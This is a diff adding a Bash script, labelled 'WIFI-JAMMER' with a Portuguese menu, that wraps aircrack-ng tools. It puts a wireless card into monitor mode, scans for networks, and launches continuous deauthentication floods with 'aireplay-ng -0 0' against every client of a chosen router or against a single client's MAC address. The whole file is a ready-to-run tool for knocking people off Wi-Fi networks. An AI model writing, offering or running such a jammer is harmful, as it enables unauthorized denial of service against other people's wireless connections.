@@ -1,0 +1,99 @@
+#!/bin/bash
+clear
+menu(){
+	echo
+	echo "-------------------------------"
+	echo "            WIFI-JAMMER          "
+	echo "	     04.02.17            "
+	echo "   'cuz we jamming ¯\_(ツ)_/¯  "
+	echo "    063 061 063 164 060 156    "
+	echo "-------------------------------"
+	echo
+	echo " 1. preparar placa de rede     "
+	echo " 2. procurar redes             "
+	echo " 3. selecionar rede            "
+	echo " 4. matar todos                "
+	echo " 5. matar cliente              "
+	echo " 6. off monitor mode           "	
+	echo " 7. quit	                     "
+	echo
+	echo "-------------------------------"       
+	echo -n "selecionar opçao: "
+	read op
+	case $op in
+		1) preparar
+			;;
+		2) procurar
+			;;
+		3) selecao
+			;;
+		4) kill1
+			;;
+		5) killc
+			;;
+		6) offmon
+			;;		
+		7) exit
+			;;
+	esac
+}
+
+preparar() {
+airmon-ng check kill; airmon-ng check; 
+echo -n "qual é a placa de rede? "
+read wlan
+airmon-ng start $wlan
+read -n 1 -s -p "tecla p continuar..."
+menu
+}
+
+procurar() {
+echo -n "placa em modo monitor > "
+read mon
+nohup xterm -hold -e airodump-ng $mon >/dev/null 2>&1 &
+read -n 1 -s -p "tecla p continuar..."
+menu
+}
+
+selecao() {
+echo -n "placa em modo monitor > "
+read mon1
+echo -n "bssid do router > "
+read bssid
+echo -n "o channel > "
+read channel
+nohup xterm -hold -e airodump-ng $mon1 --bssid $bssid --channel $channel >/dev/null 2>&1 &
+read -n 1 -s -p "tecla p continuar..."
+menu
+}
+
+kill1() {
+echo -n "placa em modo monitor > "
+read mon2
+echo -n "bssid do router > "
+read bssid
+nohup xterm -hold -e aireplay-ng -0 0 -a $bssid $mon2 >/dev/null 2>&1 &
+read -n 1 -s -p "tecla p continuar..."
+menu
+}
+
+killc() {
+echo -n "placa em modo monitor > "
+read mon3
+echo -n "bssid do router > "
+read bssid
+echo -n "mac do cliente > "
+read cliente
+nohup xterm -hold -e aireplay-ng -0 0 -a $bssid -c $cliente $mon3 >/dev/null 2>&1 &
+read -n 1 -s -p "tecla p continuar..."
+menu
+}
+
+offmon() {
+echo -n "placa em modo monitor > "
+read mon4
+airmon-ng stop $mon4
+read -n 1 -s -p "tecla p continuar..."
+menu
+}
+menu
